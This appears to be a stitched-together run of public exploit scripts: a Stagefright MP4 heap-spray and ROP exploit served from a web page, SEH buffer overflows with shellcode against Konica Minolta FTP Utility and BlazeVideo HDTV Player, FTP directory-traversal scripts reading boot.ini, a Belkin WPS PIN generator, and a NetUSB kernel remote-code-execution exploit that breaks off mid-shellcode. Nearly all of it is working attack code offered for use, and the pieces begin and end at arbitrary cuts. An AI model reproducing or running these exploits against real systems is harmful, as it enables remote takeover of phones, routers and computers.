banner +=" |_ _|_ __  / _| ___  / ___| ___ _ __      / \  | |    \n"
banner +="  | || '_ \| |_ / _ \| |  _ / _ \ '_ \    / _ \ | |    \n"
banner +="  | || | | |  _| (_) | |_| |  __/ | | |  / ___ \| |___ \n"
banner +=" |___|_| |_|_|  \___/ \____|\___|_| |_| /_/   \_\_____|\n\n"
print banner

command = "calc.exe"
evil = '<application run="' + command + '"/>'
f = open("Music.mcl","w")
f.write(evil)
f.close()
print "\n[+] Music.mcl generated . . . [+]"source: http://www.securityfocus.com/bid/57128/info

Belkin Wireless Router is prone to a security vulnerability that may allow attackers to generate a default WPS PIN.

Successfully exploiting this issue may allow attackers to generate the default WPS PIN. This may lead to other attacks.

Belkin N900 F9K1104v1 is vulnerable; other versions may also be affected.

@author       : e.novellalorente@student.ru.nl
Original work : ZhaoChunsheng 04/07/2012
 
'''
 
import sys
 
VERSION    = 0
SUBVERSION = 2
 
def usage():
    print "[+] WPSpin %d.%d " % (VERSION, SUBVERSION)
    print "[*] Usage : python WPSpin.py 123456"
    sys.exit(0)
 
def wps_pin_checksum(pin):
    accum = 0
 
    while(pin):
        accum += 3 * (pin % 10)
        pin /= 10
        accum += pin % 10
        pin /= 10
    return  (10 - accum % 10) % 10
 
try:
    if (len(sys.argv[1]) == 6):
        p = int(sys.argv[1] , 16) % 10000000
        print "[+] WPS pin is : %07d%d" % (p, wps_pin_checksum(p))
    else:
        usage()
except Exception:
    usage()
#!/usr/bin/python2

import cherrypy
import os
import pwnlib.asm as asm
import pwnlib.elf as elf
import sys
import struct


with open('shellcode.bin', 'rb') as tmp:
  shellcode = tmp.read()

while len(shellcode) % 4 != 0:
  shellcode += '\x00'

# heap grooming configuration
alloc_size = 0x20
groom_count = 0x4
spray_size = 0x100000
spray_count = 0x10

# address of the buffer we allocate for our shellcode
mmap_address = 0x90000000

# addresses that we need to predict
libc_base = 0xb6ebd000
spray_address = 0xb3000000

# ROP gadget addresses
stack_pivot = None
pop_pc = None
pop_r0_r1_r2_r3_pc = None
pop_r4_r5_r6_r7_pc = None
ldr_lr_bx_lr = None
ldr_lr_bx_lr_stack_pad = 0
mmap64 = None
memcpy = None

def find_arm_gadget(e, gadget):
  gadget_bytes = asm.asm(gadget, arch='arm')
  gadget_address = None
  for address in e.search(gadget_bytes):
    if address % 4 == 0:
      gadget_address = address
      if gadget_bytes == e.read(gadget_address, len(gadget_bytes)):
        print asm.disasm(gadget_bytes, vma=gadget_address, arch='arm')
        break
  return gadget_address

def find_thumb_gadget(e, gadget):
  gadget_bytes = asm.asm(gadget, arch='thumb')
  gadget_address = None
  for address in e.search(gadget_bytes):
    if address % 2 == 0:
      gadget_address = address + 1
      if gadget_bytes == e.read(gadget_address - 1, len(gadget_bytes)):
        print asm.disasm(gadget_bytes, vma=gadget_address-1, arch='thumb')
        break
  return gadget_address
  
def find_gadget(e, gadget):
  gadget_address = find_thumb_gadget(e, gadget)
  if gadget_address is not None:
    return gadget_address
  return find_arm_gadget(e, gadget)

def find_rop_gadgets(path):
  global memcpy
  global mmap64
  global stack_pivot
  global pop_pc
  global pop_r0_r1_r2_r3_pc
  global pop_r4_r5_r6_r7_pc
  global ldr_lr_bx_lr
  global ldr_lr_bx_lr_stack_pad

  e = elf.ELF(path)
  e.address = libc_base

  memcpy = e.symbols['memcpy']
  print '[*] memcpy : 0x{:08x}'.format(memcpy)
  mmap64 = e.symbols['mmap64']
  print '[*] mmap64 : 0x{:08x}'.format(mmap64)

  # .text:00013344    ADD             R2, R0, #0x4C
  # .text:00013348    LDMIA           R2, {R4-LR}
  # .text:0001334C    TEQ             SP, #0
  # .text:00013350    TEQNE           LR, #0
  # .text:00013354    BEQ             botch_0
  # .text:00013358    MOV             R0, R1
  # .text:0001335C    TEQ             R0, #0
  # .text:00013360    MOVEQ           R0, #1
  # .text:00013364    BX              LR

  pivot_asm = ''
  pivot_asm += 'add   r2, r0, #0x4c\n'
  pivot_asm += 'ldmia r2, {r4 - lr}\n'
  pivot_asm += 'teq   sp, #0\n'
  pivot_asm += 'teqne lr, #0'
  stack_pivot = find_arm_gadget(e, pivot_asm)
  print '[*] stack_pivot : 0x{:08x}'.format(stack_pivot)

  pop_pc_asm = 'pop {pc}'
  pop_pc = find_gadget(e, pop_pc_asm)
  print '[*] pop_pc : 0x{:08x}'.format(pop_pc)

  pop_r0_r1_r2_r3_pc = find_gadget(e, 'pop {r0, r1, r2, r3, pc}')
  print '[*] pop_r0_r1_r2_r3_pc : 0x{:08x}'.format(pop_r0_r1_r2_r3_pc)

  pop_r4_r5_r6_r7_pc = find_gadget(e, 'pop {r4, r5, r6, r7, pc}')
  print '[*] pop_r4_r5_r6_r7_pc : 0x{:08x}'.format(pop_r4_r5_r6_r7_pc)

  ldr_lr_bx_lr_stack_pad = 0
  for i in range(0, 0x100, 4):
    ldr_lr_bx_lr_asm =  'ldr lr, [sp, #0x{:08x}]\n'.format(i)
    ldr_lr_bx_lr_asm += 'add sp, sp, #0x{:08x}\n'.format(i + 8)
    ldr_lr_bx_lr_asm += 'bx  lr'
    ldr_lr_bx_lr = find_gadget(e, ldr_lr_bx_lr_asm)
    if ldr_lr_bx_lr is not None:
      ldr_lr_bx_lr_stack_pad = i
      break
  
def pad(size):
  return '#' * size

def pb32(val):
  return struct.pack(">I", val)

def pb64(val):
  return struct.pack(">Q", val)

def p32(val):
  return struct.pack("<I", val)

def p64(val):
  return struct.pack("<Q", val)

def chunk(tag, data, length=0):
  if length == 0:
    length = len(data) + 8
  if length > 0xffffffff:
    return pb32(1) + tag + pb64(length)+ data
  return pb32(length) + tag + data

def alloc_avcc(size):
  avcc = 'A' * size
  return chunk('avcC', avcc)

def alloc_hvcc(size):
  hvcc = 'H' * size
  return chunk('hvcC', hvcc)

def sample_table(data):
  stbl = ''
  stbl += chunk('stco', '\x00' * 8)
  stbl += chunk('stsc', '\x00' * 8)
  stbl += chunk('stsz', '\x00' * 12)
  stbl += chunk('stts', '\x00' * 8)
  stbl += data
  return chunk('stbl', stbl)

def memory_leak(size):
  pssh = 'leak'
  pssh += 'L' * 16
  pssh += pb32(size)
  pssh += 'L' * size
  return chunk('pssh', pssh)

def heap_spray(size):
  pssh = 'spry'
  pssh += 'S' * 16
  pssh += pb32(size)

  page = ''

  nop = asm.asm('nop', arch='thumb')
  while len(page) < 0x100:
    page += nop
  page += shellcode
  while len(page) < 0xed0:
    page += '\xcc'

  # MPEG4DataSource fake vtable
  page += p32(stack_pivot)

  # pivot swaps stack then returns to pop {pc}
  page += p32(pop_r0_r1_r2_r3_pc)

  # mmap64(mmap_address, 
  #        0x1000,
  #        PROT_READ | PROT_WRITE | PROT_EXECUTE,
  #        MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS,
  #        -1,
  #        0);

  page += p32(mmap_address)             # r0 = address
  page += p32(0x1000)                   # r1 = size
  page += p32(7)                        # r2 = protection
  page += p32(0x32)                     # r3 = flags
  page += p32(ldr_lr_bx_lr)             # pc

  page += pad(ldr_lr_bx_lr_stack_pad)
  page += p32(pop_r4_r5_r6_r7_pc)       # lr
  page += pad(4)

  page += p32(0x44444444)               # r4
  page += p32(0x55555555)               # r5
  page += p32(0x66666666)               # r6
  page += p32(0x77777777)               # r7
  page += p32(mmap64)                   # pc

  page += p32(0xffffffff)               # fd      (and then r4)
  page += pad(4)                        # padding (and then r5)
  page += p64(0)                        # offset  (and then r6, r7)
  page += p32(pop_r0_r1_r2_r3_pc)       # pc

  # memcpy(shellcode_address, 
  #        spray_address + len(rop_stack),
  #        len(shellcode));

  page += p32(mmap_address)             # r0 = dst
  page += p32(spray_address - 0xed0)    # r1 = src
  page += p32(0xed0)                    # r2 = size
  page += p32(0x33333333)               # r3
  page += p32(ldr_lr_bx_lr)             # pc

  page += pad(ldr_lr_bx_lr_stack_pad)
  page += p32(pop_r4_r5_r6_r7_pc)       # lr
  page += pad(4)

  page += p32(0x44444444)               # r4
  page += p32(0x55555555)               # r5
  page += p32(0x66666666)               # r6
  page += p32(0x77777777)               # r7
  page += p32(memcpy)                   # pc

  page += p32(0x44444444)               # r4
  page += p32(0x55555555)               # r5
  page += p32(0x66666666)               # r6
  page += p32(0x77777777)               # r7
  page += p32(mmap_address + 1)         # pc

  while len(page) < 0x1000:
    page += '#'

  pssh += page * (size // 0x1000)

  return chunk('pssh', pssh)

def exploit_mp4():
  ftyp = chunk("ftyp","69736f6d0000000169736f6d".decode("hex"))

  trak = ''

  # heap spray so we have somewhere to land our corrupted vtable 
  # pointer

  # yes, we wrap this in a sample_table for a reason; the 
  # NuCachedSource we will be using otherwise triggers calls to mmap,
  # leaving our large allocations non-contiguous and making our chance
  # of failure pretty high. wrapping in a sample_table means that we
  # wrap the NuCachedSource with an MPEG4Source, making a single 
  # allocation that caches all the data, doubling our heap spray 
  # effectiveness :-)
  trak += sample_table(heap_spray(spray_size) * spray_count)

  # heap groom for our MPEG4DataSource corruption

  # get the default size allocations for our MetaData::typed_data 
  # groom allocations out of the way first, by allocating small blocks
  # instead.
  trak += alloc_avcc(8)
  trak += alloc_hvcc(8)

  # we allocate the initial tx3g chunk here; we'll use the integer 
  # overflow so that the allocated buffer later is smaller than the 
  # original size of this chunk, then overflow all of the following 
  # MPEG4DataSource object and the following pssh allocation; hence why
  # we will need the extra groom allocation (so we don't overwrite 
  # anything sensitive...)

  # | tx3g | MPEG4DataSource | pssh |
  overflow = 'A' * 24

  # | tx3g ----------------> | pssh |
  overflow += p32(spray_address)         # MPEG4DataSource vtable ptr
  overflow += '0' * 0x48
  overflow += '0000'                    # r4
  overflow += '0000'                    # r5
  overflow += '0000'                    # r6
  overflow += '0000'                    # r7
  overflow += '0000'                    # r8
  overflow += '0000'                    # r9
  overflow += '0000'                    # r10
  overflow += '0000'                    # r11
  overflow += '0000'                    # r12
  overflow += p32(spray_address + 0x20) # sp
  overflow += p32(pop_pc)               # lr

  trak += chunk("tx3g", overflow)

  # defragment the for alloc_size blocks, then make our two
  # allocations. we end up with a spurious block in the middle, from
  # the temporary ABuffer deallocation.

  # | pssh | - | pssh |
  trak += memory_leak(alloc_size) * groom_count

  # | pssh | - | pssh | .... | avcC |
  trak += alloc_avcc(alloc_size)

  # | pssh | - | pssh | .... | avcC | hvcC |
  trak += alloc_hvcc(alloc_size)

  # | pssh | - | pssh | pssh | avcC | hvcC | pssh |
  trak += memory_leak(alloc_size) * 8

  # | pssh | - | pssh | pssh | avcC | .... |
  trak += alloc_hvcc(alloc_size * 2)

  # entering the stbl chunk triggers allocation of an MPEG4DataSource
  # object

  # | pssh | - | pssh | pssh | avcC | MPEG4DataSource | pssh |
  stbl = ''

  # | pssh | - | pssh | pssh | .... | MPEG4DataSource | pssh |
  stbl += alloc_avcc(alloc_size * 2)

  # | pssh | - | pssh | pssh | tx3g | MPEG4DataSource | pssh |
  # | pssh | - | pssh | pssh | tx3g ----------------> |
  overflow_length = (-(len(overflow) - 24) & 0xffffffffffffffff)
  stbl += chunk("tx3g", '', length = overflow_length)

  trak += chunk('stbl', stbl)

  return ftyp + chunk('trak', trak)

index_page = '''
<!DOCTYPE html>
<html>
  <head>
    <title>Stagefrightened!</title>
  </head>
  <body>
    <script>
    window.setTimeout('location.reload(true);', 4000);
    </script>
    <iframe src='/exploit.mp4'></iframe>
  </body>
</html>
'''

class ExploitServer(object):

  exploit_file = None
  exploit_count = 0

  @cherrypy.expose
  def index(self):
    self.exploit_count += 1
    print '*' * 80
    print 'exploit attempt: ' + str(self.exploit_count)
    print '*' * 80
    return index_page

  @cherrypy.expose(["exploit.mp4"])
  def exploit(self):
    cherrypy.response.headers['Content-Type'] = 'video/mp4'
    cherrypy.response.headers['Content-Encoding'] = 'gzip'

    if self.exploit_file is None:
      exploit_uncompressed = exploit_mp4()
      with open('exploit_uncompressed.mp4', 'wb') as tmp:
        tmp.write(exploit_uncompressed)
      os.system('gzip exploit_uncompressed.mp4')
      with open('exploit_uncompressed.mp4.gz', 'rb') as tmp:
        self.exploit_file = tmp.read()
      os.system('rm exploit_uncompressed.mp4.gz')

    return self.exploit_file

def main():
  find_rop_gadgets('libc.so')
  with open('exploit.mp4', 'wb') as tmp:
    tmp.write(exploit_mp4())
  cherrypy.quickstart(ExploitServer())

if __name__ == '__main__':
  main()# Title: Konica Minolta FTP Utility - Remote Command Execution
# Date : 20/09/2015
# Author: R-73eN
# Software: Konica Minolta FTP Utility v1.0
# Tested: Windows XP SP3 
# Software link: http://download.konicaminolta.hk/bt/driver/mfpu/ftpu/ftpu_10.zip
# Every command is vulnerable to buffer overflow.

import socket
import struct

shellcode =  ""#msfvenom -p windows/exec cmd=calc.exe -f python -b "\x00\x0d\x0a\x3d\x5c\x2f"
shellcode += "\xbd\xfe\xbd\x27\xc9\xda\xd8\xd9\x74\x24\xf4\x5e\x29"
shellcode += "\xc9\xb1\x31\x31\x6e\x13\x83\xee\xfc\x03\x6e\xf1\x5f"
shellcode += "\xd2\x35\xe5\x22\x1d\xc6\xf5\x42\x97\x23\xc4\x42\xc3"
shellcode += "\x20\x76\x73\x87\x65\x7a\xf8\xc5\x9d\x09\x8c\xc1\x92"
shellcode += "\xba\x3b\x34\x9c\x3b\x17\x04\xbf\xbf\x6a\x59\x1f\xfe"
shellcode += "\xa4\xac\x5e\xc7\xd9\x5d\x32\x90\x96\xf0\xa3\x95\xe3"
shellcode += "\xc8\x48\xe5\xe2\x48\xac\xbd\x05\x78\x63\xb6\x5f\x5a"
shellcode += "\x85\x1b\xd4\xd3\x9d\x78\xd1\xaa\x16\x4a\xad\x2c\xff"
shellcode += "\x83\x4e\x82\x3e\x2c\xbd\xda\x07\x8a\x5e\xa9\x71\xe9"
shellcode += "\xe3\xaa\x45\x90\x3f\x3e\x5e\x32\xcb\x98\xba\xc3\x18"
shellcode += "\x7e\x48\xcf\xd5\xf4\x16\xd3\xe8\xd9\x2c\xef\x61\xdc"
shellcode += "\xe2\x66\x31\xfb\x26\x23\xe1\x62\x7e\x89\x44\x9a\x60"
shellcode += "\x72\x38\x3e\xea\x9e\x2d\x33\xb1\xf4\xb0\xc1\xcf\xba"
shellcode += "\xb3\xd9\xcf\xea\xdb\xe8\x44\x65\x9b\xf4\x8e\xc2\x53"
shellcode += "\xbf\x93\x62\xfc\x66\x46\x37\x61\x99\xbc\x7b\x9c\x1a"
shellcode += "\x35\x03\x5b\x02\x3c\x06\x27\x84\xac\x7a\x38\x61\xd3"
shellcode += "\x29\x39\xa0\xb0\xac\xa9\x28\x19\x4b\x4a\xca\x65"
banner = ""
banner +="  ___        __        ____                 _    _  \n"  
banner +=" |_ _|_ __  / _| ___  / ___| ___ _ __      / \  | |    \n"
banner +="  | || '_ \| |_ / _ \| |  _ / _ \ '_ \    / _ \ | |    \n"
banner +="  | || | | |  _| (_) | |_| |  __/ | | |  / ___ \| |___ \n"
banner +=" |___|_| |_|_|  \___/ \____|\___|_| |_| /_/   \_\_____|\n\n"
print banner
nSEH = "\xEB\x13\x90\x90"
SEH = struct.pack('<L',0x1220401E)
evil = "A" * 8343 + nSEH + SEH + "\x90" * 22 + shellcode +"D" * (950 - len(shellcode))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server = raw_input('Enter IP : ')
s.connect((server, 21))
a = s.recv(1024)
print ' [+] ' + a
s.send('User ' + evil )
print '[+] https://www.infogen.al/ [+]'
#!/usr/bin/python
# title: PCMan FTP Server v2.0.7 Directory Traversal
# author: Jay Turla <@shipcod3>
# tested on Windows XP Service Pack 3 - English
# software Link: https://www.exploit-db.com/apps/9fceb6fefd0f3ca1a8c36e97b6cc925d-PCMan.7z
# description: PCMAN FTP 2.07 is vulnerable to Directory Traversal (quick and dirty code just for PoC) 

from ftplib import FTP

ftp = FTP(raw_input("Target IP: ")) 
ftp.login()                   
ftp.retrbinary('RETR ..//..//..//..//..//..//..//..//..//..//..//boot.ini', open('boot.ini.txt', 'wb').write)
ftp.close()
file = open('boot.ini.txt', 'r')
print "[**] Printing what's inside boot.ini\n"
print "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
print file.read()
print "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
#!/usr/bin/python
# title: BisonWare BisonFTP server product V3.5 Directory Traversal Vulnerability
# author: Jay Turla <@shipcod3>
# tested on Windows XP Service Pack 3 - English
# software link: https://www.exploit-db.com/apps/081331edfc143738a60e029192b5986e-BisonFTPServer.rar
# description: BisonWare BisonFTP server product V3.5 is vulnerable to Directory Traversal (quick and dirty code just for PoC) 

from ftplib import FTP

ftp = FTP(raw_input("Target IP: ")) 
ftp.login()                   
ftp.retrbinary('RETR ../../../boot.ini', open('boot.ini.txt', 'wb').write)
ftp.close()
file = open('boot.ini.txt', 'r')
print "[**] Printing what's inside boot.ini\n"
print "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
print file.read()
print "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
source: http://www.securityfocus.com/bid/58624/info

BlazeVideo HDTV Player Standard is prone to a remote buffer-overflow vulnerability because it fails to perform adequate boundary checks on user-supplied input.

Attackers may leverage this issue to execute arbitrary code in the context of the application. Failed exploit attempts may result in a denial-of-service condition.

BlazeVideo HDTV Player Standard 6.6.0.2 is vulnerable; other versions may also be affected. 

# Exploit Title:BlazeVideo HDTV Player Standard 6.6.0.2 SEH Buffer Overflow
# Date: 19-03-2013
# Exploit Author: metacom
# RST
# Vendor Homepage: http://www.blazevideo.com/hdtv-player/
# Download version 6.6.0.2: www.blazevideo.com/download.php?product=blazevideo-hdtv-std
# Version: BlazeVideo HDTV Player Standard 6.6.0.2
# Tested on: Windows 7 German

filename="poc.PLF"



junk = "http://"+ "\x41" * 601 
nseh = "\xEB\x06\x90\x90"
seh  = "\x5F\x17\x60\x61"  #6160175F \EPG.dll
nops = "\x90" * 20
#windows/exec CMD=calc.exe bad \x00\x0a\x1a  
shellcode= ("\xb8\xaf\x8c\x07\x94\xda\xcd\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\x33\x31\x42\x12\x83\xea\xfc\x03\xed\x82\xe5\x61\x0d\x72\x60"
"\x89\xed\x83\x13\x03\x08\xb2\x01\x77\x59\xe7\x95\xf3\x0f\x04"
"\x5d\x51\xbb\x9f\x13\x7e\xcc\x28\x99\x58\xe3\xa9\x2f\x65\xaf"
"\x6a\x31\x19\xad\xbe\x91\x20\x7e\xb3\xd0\x65\x62\x3c\x80\x3e"
"\xe9\xef\x35\x4a\xaf\x33\x37\x9c\xa4\x0c\x4f\x99\x7a\xf8\xe5"
"\xa0\xaa\x51\x71\xea\x52\xd9\xdd\xcb\x63\x0e\x3e\x37\x2a\x3b"
"\xf5\xc3\xad\xed\xc7\x2c\x9c\xd1\x84\x12\x11\xdc\xd5\x53\x95"
"\x3f\xa0\xaf\xe6\xc2\xb3\x6b\x95\x18\x31\x6e\x3d\xea\xe1\x4a"
"\xbc\x3f\x77\x18\xb2\xf4\xf3\x46\xd6\x0b\xd7\xfc\xe2\x80\xd6"
"\xd2\x63\xd2\xfc\xf6\x28\x80\x9d\xaf\x94\x67\xa1\xb0\x70\xd7"
"\x07\xba\x92\x0c\x31\xe1\xf8\xd3\xb3\x9f\x45\xd3\xcb\x9f\xe5"
"\xbc\xfa\x14\x6a\xba\x02\xff\xcf\x34\x49\xa2\x79\xdd\x14\x36"
"\x38\x80\xa6\xec\x7e\xbd\x24\x05\xfe\x3a\x34\x6c\xfb\x07\xf2"
"\x9c\x71\x17\x97\xa2\x26\x18\xb2\xc0\xa9\x8a\x5e\x29\x4c\x2b"
"\xc4\x35")

f = open(filename,"wb")
f.write(junk+nseh+seh+nops+shellcode)
f.close()
print("Finish")

#!/usr/bin/env python
# Source: http://haxx.in/blasty-vs-netusb.py
#
# CVE-2015-3036 - NetUSB Remote Code Execution exploit (Linux/MIPS) 
# ===========================================================================
# This is a weaponized exploit for the NetUSB kernel vulnerability 
# discovered by SEC Consult Vulnerability Lab. [1]
# 
# I don't like lazy vendors, I've seen some DoS PoC's floating around
# for this bug.. and it's been almost five(!) months. So lets kick it up 
# a notch with an actual proof of concept that yields code exec.
#
# So anyway.. a remotely exploitable kernel vulnerability, exciting eh. ;-)
# 
# Smash stack, ROP, decode, stage, spawn userland process. woo!
#
# Currently this is weaponized for one target device (the one I own, I was
# planning on porting OpenWRT but got sidetracked by the NetUSB stuff in 
# the default firmware image, oooops. ;-D).
#
# This python script is horrible, but its not about the glue, its about
# the tech contained therein. Some things *may* be (intentionally?) botched..
# lets see if "the community" cares enough to develop this any further,
# I need to move on with life. ;-D
# 
# Shoutouts to all my boys & girls around the world, you know who you are!
#
# Peace,
# -- blasty <peter@haxx.in> // 20151013
#
# References:
# [1] : https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt
# /20150519-0_KCodes_NetUSB_Kernel_Stack_Buffer_Overflow_v10.txt
#

import os, sys, struct, socket, time

from Crypto.Cipher import AES

def u32(v):
	return struct.pack("<L", v)

def banner():
	print ""
	print "## NetUSB (CVE-2015-3036) remote code execution exploit"
	print "## by blasty <peter@haxx.in>"
	print ""

def usage(prog):
	print "usage   : %s <host> <port> <cmd>" % (prog)
	print "example : %s 127.0.0.1 20005 'wget connectback..." % (prog)
	print ""

banner()

if len(sys.argv) != 4:
	usage(sys.argv[0])
	exit(0)


cmd = sys.argv[3]

# Here's one, give us more! (hint: /proc/kallsyms and objdump, bro)
targets = [
	{
		"name" : "WNDR3700v5 - Linux 2.6.36 (mips32-le)",
		"kernel_base" : 0x80001000,

		# adjust to offset used in 'load_addr_and_jump' gadget
		# should be some big immediate to avoid NUL bytes
		"load_addr_offset" : 4156,
		"gadgets" : {
			# 8c42103c  lw      v0,4156(v0)
			# 0040f809  jalr    v0
			# 00000000  nop
			'load_addr_and_jump' : 0x1f548,

			# 8fa20010  lw      v0,16(sp)
			# 8fbf001c  lw      ra,28(sp)
			# 03e00008  jr      ra
			# 27bd0020  addiu   sp,sp,32
			'load_v0_and_ra' : 0x34bbc,

			# 27b10010  addiu   s1,sp,16
			# 00602021  move    a0,v1
			# 0040f809  jalr    v0
			# 02202821  move    a1,s1
			'move_sp_plus16_to_s1' : 0x63570,

			# 0220f809  jalr    s1
			# 00000000  nop
			'jalr_s1' : 0x63570,

			'a_r4k_blast_dcache' : 0x6d4678,
			'kmalloc' : 0xb110c,
			'ks_recv' : 0xc145e270,
			'call_usermodehelper_setup' : 0x5b91c,
			'call_usermodehelper_exec' :  0x5bb20
		}
	}
]

# im lazy, hardcoded to use the only avail. target for now
# hey, at least I made it somewhat easy to easily add new targets
target = targets[0]

# hullo there.
hello = "\x56\x03"

# sekrit keyz that are hardcoded in netusb.ko, sorry KCodes
# people, this is not how you implement auth. lol.
aesk0 = "0B7928FF6A76223C21A3B794084E1CAD".decode('hex')
aesk1 = "A2353556541CFE44EC468248064DE66C".decode('hex')

key = aesk1
IV = "\x00"*16
mode = AES.MODE_CBC
aes = AES.new(key, mode, IV=IV)

aesk0_d = aes.decrypt(aesk0)

aes2 = AES.new(aesk0_d, mode, IV="\x00"*16)

s = socket.create_connection((sys.argv[1], int(sys.argv[2], 0)))

print "[>] sending HELLO pkt"
s.send(hello)
time.sleep(0.2)

verify_data = "\xaa"*16

print "[>] sending verify data"
s.send(verify_data)
time.sleep(0.2)

print "[>] reading response"
data = s.recv(0x200)

print "[!] got %d bytes .." % len(data)
print "[>] data: " + data.encode('hex')

pkt = aes2.decrypt(data)

print "[>] decr: " + pkt.encode("hex")

if pkt[0:16] != "\xaa"*16:
	print "[!] error: decrypted rnd data mismatch :("
	exit(-1)

rnd = data[16:]

aes2 = AES.new(aesk0_d, mode, IV="\x00"*16)
pkt_c = aes2.encrypt(rnd)

print "[>] sending back crypted random data"
s.send(pkt_c)

# Once upon a time.. 
d = "A"

# hardcoded decoder_key, this one is 'safe' for the current stager
decoder_key = 0x1337babf

# NUL-free mips code which decodes the next stage,
# flushes the d-cache, and branches there.
# loosely inspired by some shit Julien Tinnes once wrote.
decoder_stub = [
	0x0320e821, # move	sp,t9
	0x27a90168, # addiu	t1,sp,360
	0x2529fef0, # addiu	t1,t1,-272
	0x240afffb, # li	t2,-5
	0x01405027, # nor	t2,t2,zero
	0x214bfffc, # addi	t3,t2,-4
	0x240cff87, # li	t4,-121
	0x01806027,	# nor	t4,t4,zero
	0x3c0d0000,	# [8] lui	t5, xorkey@hi
	0x35ad0000, # [9] ori	t5,t5, xorkey@lo
	0x8d28fffc, # lw	t0,-4(t1)
	0x010d7026, # xor	t6,t0,t5
	0xad2efffc, # sw	t6,-4(t1)
	0x258cfffc, # addiu	t4,t4,-4
	0x140cfffb, # bne	zero,t4,0x28
	0x012a4820, # add	t1,t1,t2
	0x3c190000, # [16] lui	t9, (a_r4k_blast_dcache-0x110)@hi
	0x37390000, # [17] ori	t9,t9,(a_r4k_blast_dcache-0x110)@lo
	0x8f390110, # lw	t9,272(t9)
	0x0320f809, # jalr	t9
	0x3c181234, # lui	t8,0x1234
]

# patch xorkey into decoder stub
decoder_stub[8] = decoder_stub[8] | (decoder_key >> 16)
decoder_stub[9] = decoder_stub[9] | (decoder_key & 0xffff)

r4k_blast_dcache = target['kernel_base']
r4k_blast_dcache = r4k_blast_dcache + target['gadgets']['a_r4k_blast_dcache']

# patch the r4k_blast_dcache address in decoder stub
decoder_stub[16] = decoder_stub[16] | (r4k_blast_dcache >> 16)
decoder_stub[17] = decoder_stub[17] | (r4k_blast_dcache & 0xffff)

# pad it out
d += "A"*(233-len(d))

# kernel payload stager
kernel_stager = [
	0x27bdffe0, # addiu	sp,sp,-32
	0x24041000, # li	a0,4096
	0x24050000, # li	a1,0
	0x3c190000, # [3] lui	t9,kmalloc@hi
	0x37390000,	# [4] ori	t9,t9,kmalloc@lo
	0x0320f809, # jalr	t9
	0x00000000, # nop
	0x0040b821, # move	s7,v0
	0x02602021, # move	a0,s3
	0x02e02821, # move	a1,s7
	0x24061000, # li	a2,4096
	0x00003821, # move	a3,zero
	0x3c190000,	# [12] lui	t9,ks_recv@hi
	0x37390000, # [13] ori	t9,t9,ks_recv@lo
	0x0320f809, # jalr	t9
	0x00000000, # nop
	0x3c190000, # [16] lui	t9,a_r4k_blast_dcache@hi
	0x37390000, # [17] ori	t9,t9,a_r4k_blast_dcache@lo
	0x8f390000, # lw	t9,0(t9)
	0x0320f809, # jalr	t9
	0x00000000, # nop
	0x02e0f809, # jalr	s7
	0x00000000 	# nop
]

kmalloc = target['kernel_base'] + target['gadgets']['kmalloc']
ks_recv = target['gadgets']['ks_recv']

# patch kernel stager
kernel_stager[3] = kernel_stager[3] | (kmalloc >> 16)
kernel_stager[4] = kernel_stager[4] | (kmalloc & 0xffff)

kernel_stager[12] = kernel_stager[12] | (ks_recv >> 16)
kernel_stager[13] = kernel_stager[13] | (ks_recv & 0xffff)

kernel_stager[16] = kernel_stager[16] | (r4k_blast_dcache >> 16)
kernel_stager[17] = kernel_stager[17] | (r4k_blast_dcache & 0xffff)

# a ROP chain for MIPS, always ew.
rop = [
	# this gadget will
	# v0 = *(sp+16)
	# ra = *(sp+28)
	# sp += 32
	target['kernel_base'] + target['gadgets']['load_v0_and_ra'],

	# stack for the g_load_v0_and_ra gadget
	0xaaaaaaa1, # sp+0
	0xaaaaaaa2, # sp+4
	0xaaaaaaa3, # sp+8
	0xaaaaaaa4, # sp+12
	r4k_blast_dcache - target['load_addr_offset'], # sp+16 / v0
	0xaaaaaaa6, # sp+20
	0xaaaaaaa7, # sp+24

	# this gadget will
	# v0 = *(v0 + 4156)
	# v0();
	# ra = *(sp + 20)
	# sp += 24
	# ra();
	target['kernel_base'] + target['gadgets']['load_addr_and_jump'], # sp+28

	0xbbbbbbb2,
	0xccccccc3,
	0xddddddd4,
	0xeeeeeee5,
	0xeeeeeee6,

	# this is the RA fetched by g_load_addr_and_jump
	target['kernel_base'] + target['gadgets']['load_v0_and_ra'],
	# stack for the g_load_v0_and_ra gadget
	0xaaaaaaa1, # sp+0
	0xaaaaaaa2, # sp+4
	0xaaaaaaa3, # sp+8
	0xaaaaaaa4, # sp+12
	target['kernel_base'] + target['gadgets']['jalr_s1'],  #  sp+16 / v0
	0xaaaaaaa6, # sp+20
	0xaaaaaaa7, # sp+24
	target['kernel_base'] + target['gadgets']['move_sp_plus16_to_s1'], # ra
	
	# second piece of native code getting executed, pivot back in the stack
	0x27b9febc, # t9 = sp - offset
	0x0320f809, # jalr t9 
	0x3c181234, # nop
	0x3c181234, # nop

	# first native code getting executed, branch back to previous 4 opcodes
	0x03a0c821, # move t9, sp
	0x0320f809, # jalr t9
	0x3c181234,
]

# append rop chain to buffer
for w in rop:
	d += u32(w)

# append decoder_stub to buffer
for w in decoder_stub:
	d += u32(w)

# encode stager and append to buffer
for w in kernel_stager:
	d += u32(w ^ decoder_key)

print "[>] sending computername_length.."
time.sleep(0.1)
s.send(struct.pack("<L", len(d)))

print "[>] sending payload.."
time.sleep(0.1)
s.send(d)
time.sleep(0.1)

print "[>] sending stage2.."

# a useful thing to do when you bust straight into the kernel 
# is to go back to userland, huhuhu.
# thanks to jix for the usermodehelper suggestion! :)
kernel_shellcode = [
	0x3c16dead, # lui	s6,0xdead
	0x3c19dead, # lui	t9,0xdead
	0x3739c0de, # ori	t9,t9,0xc0de
	0x2404007c, # li	a0, argv
	0x00972021, # addu	a0,a0,s7
	0x2405008c, # li	a1, argv0
	0x00b72821, # addu	a1,a1,s7
	0xac850000, # sw	a1,0(a0)
	0x24050094, # li	a1, argv1
	0x00b72821, # addu	a1,a1,s7
	0xac850004, # sw	a1,4(a0)
	0x24060097, # li	a2, argv2
	0x00d73021, # addu	a2,a2,s7
	0xac860008, # sw	a2,8(a0)
